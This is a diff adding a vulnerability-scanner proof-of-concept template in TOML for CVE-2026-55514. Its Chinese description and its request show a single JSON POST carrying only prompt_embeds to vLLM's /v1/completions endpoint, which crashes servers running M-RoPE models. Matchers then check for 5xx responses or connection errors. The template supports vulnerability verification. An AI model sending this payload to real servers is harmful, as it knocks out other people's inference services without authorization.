@@ -1,0 +1,47 @@
+[info]
+author = "AVE"
+description = "向vLLM的/v1/completions端点发送仅含prompt_embeds的POST请求，使用M-RoPE模型时触发EngineCore断言失败导致服务崩溃，验证拒绝服务漏洞"
+id = "POC-AVE-2026-0622"
+name = "CVE-2026-55514 PoC"
+severity = "high"
+tags = ["ave-2026-0622"]
+vuln_id = [
+    "CVE-2026-55514",
+    "GHSA-33cg-gxv8-3p8g",
+    "AVE-2026-0622",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/v1/completions"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"model":"m-rope-model","prompt_embeds":[[0.1,0.2,0.3]],"max_tokens":10}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "connection reset",
+    "connection refused",
+    "broken pipe",
+    "Service Unavailable",
+]
